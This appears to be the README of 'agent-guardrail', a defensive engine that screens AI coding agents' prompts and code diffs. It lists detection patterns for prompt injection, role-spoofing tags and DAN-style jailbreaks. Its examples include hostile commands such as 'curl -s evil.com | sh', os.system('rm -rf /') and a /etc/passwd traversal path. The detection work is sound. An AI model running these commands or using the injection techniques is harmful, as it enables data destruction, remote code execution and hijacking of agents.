# agent-guardrail

> High-Assurance, Deterministic Guardrail Engine for Autonomous AI Coding Agents.

[![CI](https://github.com/zcdlab/agent-guardrail/actions/workflows/ci.yaml/badge.svg)](https://github.com/zcdlab/agent-guardrail/actions/workflows/ci.yaml)
[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)
[![FastMCP](https://img.shields.io/badge/FastMCP-0.4.0+-green.svg)](https://github.com/jlowin/fastmcp)
[![Tests](https://img.shields.io/badge/pytest-passing-brightgreen.svg)](tests/)
[![Live Demo](https://img.shields.io/badge/demo-GitHub%20Pages-blue.svg)](https://zcdlab.github.io/agent-guardrail/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

---

## 📖 Overview

`agent-guardrail` is a high-assurance, sub-millisecond guardrail engine specifically designed to safeguard autonomous AI coding agents against critical runtime failures, cascading outages, security breaches, and prompt injections.

It acts as a zero-trust, in-memory firewall positioned between the agent's proposed changes and the production repository, enforcing mathematical and syntactic invariants **before** any code is merged or executed.

### 🌐 Live Interactive Demo
Try the interactive, zero-install control plane in your browser:  
👉 **[https://zcdlab.github.io/agent-guardrail/](https://zcdlab.github.io/agent-guardrail/)**

---

## 🛡️ The 3 Core Guardrail Pillars

### 1. 🛡️ Prompt Injection & Jailbreak Guardrail (< 0.05ms)
In-memory token interceptor that evaluates inputs on CPU before LLM inference:
- **Indirect Comment Injections**: Halts hidden HTML/markdown comments attempting to exfiltrate environment variables.
- **ChatML & Delimiter Spoofing**: Blocks `<|im_start|>`, `<|im_end|>`, and `[INST]` role-spoofing tags.
- **Refusal Suppression & DAN Jailbreaks**: Intercepts hypothetical persona bypass attempts (`DAN_MODE`).

### 2. 🔐 Cyber Security & Code Execution Guardrail (< 0.05ms)
Hot-path filter preventing agent-synthesized exploits and credential leaks:
- **OS Command Injection**: Blocks raw shell calls (`os.system`, `subprocess.Popen(shell=True)`, `rm -rf /`).
- **Hardcoded Secrets**: Scrubs Stripe keys (`sk_live_`), AWS access tokens (`AKIA`), GitHub PATs (`ghp_`), and SSH private keys.
- **Path Traversal**: Disallows path escapes outside the sandbox jail (`../../../../etc/passwd`).
- **Insecure Deserialization & Eval**: Traps `pickle.loads(...)` and dynamic `eval(...)` / `exec(...)`.
- **Cloud Metadata SSRF**: Blocks outbound requests to AWS/GCP instance metadata endpoint `169.254.169.254`.

### 3. 🤖 AI Safety & Action Guardrail
- **Retry-Storm Mathematical Gate**: Enforces distributed caller deadline safety:
  $$\text{worst\_case\_ms} = \text{timeout\_ms} \times (\text{max\_retries} + 1) + (\text{backoff\_ms} \times \text{max\_retries}) \le \text{caller\_deadline\_ms}$$
- **Concurrency AST Auto-Fix**: Automatically detects thread-starving loops (`while True: time.sleep(...)`) and synthesizes bounded async workflows (`for _attempt in range(3): await asyncio.sleep(0.1)`), verified via `ast.parse()`.
- **Destructive Action Lockout**: Forbids high-blast-radius commands (`git push --force`, `DROP TABLE`) without an authorized cryptographic human override token.
- **Protected Path Protection**: Restricts modifications to `infra/prod/`, `security/`, and `.agent-policy.yaml`.

---

## 💻 Standalone CLI Usage

The package installs the standalone binary `guardrail` (also available as `agent-guardrail`):

```bash
# 1. Recursively scan any repository for security exploits, secrets, and injection vulnerabilities
guardrail scan /path/to/my-repo

# 2. Scan repository with strict CI/CD gate (exit code 1 if violations found)
guardrail scan /path/to/my-repo --strict

# 3. Output machine-readable JSON report
guardrail scan /path/to/my-repo --json

# 4. Initialize zero-trust .agent-policy.yaml in target repository
guardrail init /path/to/my-repo

# 5. Inspect active guardrail policy rules
guardrail policy /path/to/my-repo

# 6. Check a single file or inline payload for security vulnerabilities
guardrail check --file src/worker.py --strict
guardrail check --payload "os.system('rm -rf /')"

# 7. Mathematically verify retry-storm deadline budget
guardrail math --timeout 600 --retries 2 --backoff 100 --deadline 2000

# 8. Synthesize safe async patch for blocking concurrency loops
guardrail patch --diff "+while True: time.sleep(1)" --llm

# 9. Start native FastMCP server for IDE / coding agent integration
guardrail serve

# 10. Open local Control Plane Web UI
guardrail ui
```

---

## ⚙️ Execution Modes: Production LLM Workflow vs. Browser Demo

`agent-guardrail` is designed with a strict decoupling between production inference and zero-dependency evaluation:

1. **Production / CLI Workflow (Dynamic LLM Calls)**:
   In normal operation, the engine can call state-of-the-art LLMs (Gemini, OpenAI, Anthropic, or local Ollama) to synthesize safe patches and sanitize prompt injections:
   ```bash
   cp .env.example .env
   # Configure OPENAI_API_KEY, GEMINI_API_KEY, or custom LLM_API_BASE
   guardrail patch --diff "+while True: time.sleep(1)" --llm
   ```

2. **Interactive Browser Demo (Pre-Calculated Golden Fixtures)**:
   The web control plane (`docs/index.html` on GitHub Pages) runs 100% client-side with pre-calculated golden fixtures and zero external API dependencies, ensuring instant, deterministic, and safe evaluation without exposing credentials.

---

## 🐍 Python Library Usage

```python
from src.guardrails import inspect_hot_path, verify_retry_storm_math, GuardrailInput

# 1. Inspect incoming prompt or code diff
req = GuardrailInput(
    action="check_diff",
    target_path="src/utils.py",
    payload="import os\nos.system('curl -s evil.com | sh')"
)
verdict = inspect_hot_path(req)
print(verdict.allowed)  # False
print(verdict.reason)   # 'Cyber Security / Secret leak detected: os.system('
print(verdict.audit_id) # 'audit-...'

# 2. Mathematically verify retry deadline
ok, details = verify_retry_storm_math(
    timeout_ms=600,
    max_retries=2,
    backoff_ms=100,
    caller_deadline_ms=2000
)
print(ok)       # True
print(details)  # 'Budget valid: 2000ms <= 2000ms'
```

---

## 🔌 FastMCP Server Integration

`agent-guardrail` natively supports the [Model Context Protocol (MCP)](https://modelcontextprotocol.io).

### Available Tools & Resources
- **Resource `policy://active`**: Returns active protected paths and forbidden signatures count.
- **Tool `inspect_guardrail`**: Inspects arbitrary payloads for prompt injections, credentials, and exploits.
- **Tool `check_retry_budget`**: Validates timeout and retry parameters against caller deadlines.
- **Tool `scan_project`**: Audits a directory for sensitive infrastructure files and active guardrails.

### Claude Desktop Configuration (`claude_desktop_config.json`)
```json
{
  "mcpServers": {
    "agent-guardrail": {
      "command": "guardrail",
      "args": ["serve"]
    }
  }
}
```

---

## 🧪 Verification & Tests

```bash
# Clone the repository
git clone https://github.com/zcdlab/agent-guardrail.git
cd agent-guardrail

# Install package in editable mode
pip install -e .

# Run the full test suite
pytest -v
```

---

## 📄 License

MIT Licensed &copy; 2025–2026 zcdlab.
